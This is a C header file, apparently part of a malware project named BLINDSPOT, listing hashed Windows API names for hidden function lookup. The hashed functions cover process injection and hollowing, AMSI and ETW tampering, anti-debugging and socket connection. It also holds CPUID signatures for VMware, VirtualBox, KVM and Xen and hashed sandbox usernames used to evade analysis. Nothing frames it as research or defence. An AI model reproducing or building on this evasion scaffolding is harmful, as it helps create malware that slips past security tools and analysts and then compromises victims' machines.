// src/common/hashes.h
// Сгенерировано calc_all_hashes.exe (MurmurHash-подобный алгоритм)
#ifndef BLINDSPOT_HASHES_H
#define BLINDSPOT_HASHES_H

#define API_HASH_SEED 0x13371337

// === kernel32.dll ===
#define H_LoadLibraryA                   0x124CC339
#define H_GetProcAddress                 0x3A45CCAC
#define H_VirtualAlloc                   0xC463192B
#define H_VirtualFree                    0x4220F76E
#define H_VirtualProtect                 0x213A6DEB
#define H_GetModuleHandleA               0x98CAE6C0
#define H_GetModuleFileNameA             0x734400DA
#define H_GetModuleFileNameW             0x96CBA4EB
#define H_CreateFileA                    0xC336566D
#define H_ReadFile                       0x541ADEAE
#define H_WriteFile                      0xFE89860A
#define H_GetFileSize                    0xD62703E5
#define H_SetFilePointer                 0x5B633073
#define H_CloseHandle                    0x3D7EB074
#define H_HeapAlloc                      0x1CD205C3
#define H_HeapFree                       0xD8270895
#define H_GetProcessHeap                 0xB76BA140
#define H_ExitProcess                    0x347E9596
#define H_CreateProcessA                 0xDAFBF5B8
#define H_CreateMutexA                   0x3B18FB61
#define H_WaitForSingleObject            0x26437771
#define H_CreateEventA                   0x28D79F7E
#define H_GetTickCount64                 0x05E029C5
#define H_GlobalMemoryStatusEx           0x93604414
#define H_GetSystemInfo                  0xAA359175
#define H_GetUserNameA                   0x07325AF0
#define H_SetCurrentDirectoryA           0xC43682E7
#define H_OpenProcess                    0xFDADFFD3
#define H_CreateToolhelp32Snapshot       0x3557D5DE
#define H_Process32First                 0x7BE1F84F
#define H_Process32Next                  0x29518098
#define H_Sleep                          0xC49BFD26
#define H_IsDebuggerPresent              0x1CA54F96
#define H_CheckRemoteDebuggerPresent     0x80B54C2C
#define H_GetThreadContext               0x6CBDAE5C
#define H_OutputDebugStringA             0xC2095DBE
#define H_QueryPerformanceCounter        0xA47083A6
#define H_GetDiskFreeSpaceExA            0x4F2C3E49
#define H_GetVersionExA                  0xA895320C
#define H_GetCurrentProcess              0x599FB5AF
#define H_GetComputerNameA               0xF235E3F4
#define H_GetVolumeInformationA          0xB74C9C60
#define H_GetLastError                   0x48D626E4

// === ntdll.dll ===
#define H_NtAllocateVirtualMemory        0xF1E33392
#define H_NtProtectVirtualMemory         0x48A3A3E9
#define H_NtWriteVirtualMemory           0xF250E6AB
#define H_NtCreateThreadEx               0xBA138A26
#define H_NtQueryInformationProcess      0x8B3CB6D6
#define H_NtUnmapViewOfSection           0xF7E6F8F0
#define H_NtResumeThread                 0x8C6C65CB
#define H_NtClose                        0xB132251B
#define H_NtSetInformationThread         0x2853CDA9
#define H_NtQuerySystemInformation       0x4B971A39
#define H_EtwEventWrite                  0xB88653FE

// === user32.dll ===
#define H_MessageBoxA                    0xD4417215

// === amsi.dll ===
#define H_AmsiScanBuffer                 0x9EDDECF3

// === advapi32.dll ===
#define H_RegOpenKeyExA                  0x2EA6FCF7
#define H_RegQueryValueExA               0xF093DF7F
#define H_RegCloseKey                    0xAD9927FA

// === ws2_32.dll ===
#define H_WSAStartup                     0x60A2C725
#define H_WSASocketA                     0x086AE83C
#define H_WSAConnect                     0x1A95ECDC
#define H_closesocket                    0x3CCDF194
#define H_WSACleanup                     0xC9EB3082
#define H_inet_pton                      0x8152F862
#define H_htons                          0x896EF4BF
#define H_setsockopt                     0xB8FC8DBD

#define CPUID_VMWA_EBX  0x61774D56u
#define CPUID_VMWA_ECX  0x4D566572u
#define CPUID_VMWA_EDX  0x65726177u

#define CPUID_VBOX_EBX  0x786F4256u
#define CPUID_VBOX_ECX  0x786F4256u
#define CPUID_VBOX_EDX  0x786F4256u

#define CPUID_KVMK_EBX  0x4B4D564Bu
#define CPUID_KVMK_ECX  0x564B4D56u
#define CPUID_KVMK_EDX  0x0000004Du

#define CPUID_XENV_EBX  0x566E6558u
#define CPUID_XENV_ECX  0x65584D4Du
#define CPUID_XENV_EDX  0x4D4D566Eu

// === FNV-1a hashes (для username) ===
#define H_USER_WDAGUTILITYACCOUNT  0x81B251DDu
#define H_USER_SANDBOX             0xDA1FD924u
#define H_USER_MALWARE             0xCAAFF770u
#define H_USER_VIRUS               0xD76F265Eu

#endif